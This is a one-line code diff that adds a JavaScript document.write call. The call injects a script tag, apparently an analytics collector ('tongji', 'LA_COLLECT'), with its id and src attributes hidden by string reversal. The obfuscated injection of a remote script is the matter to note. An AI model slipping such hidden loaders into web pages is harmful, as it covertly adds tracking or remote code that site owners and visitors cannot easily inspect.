@@ -1,0 +1,1 @@
+﻿document.write('<script charset="UTF-8" '+('/js/tongji.js#/"=crs "TCELLOC_AL"=di').split('').reverse().join('')+'?id=JjEi6u9btiW2ECHy=JjEi6u9btiW2ECHy"></script>')
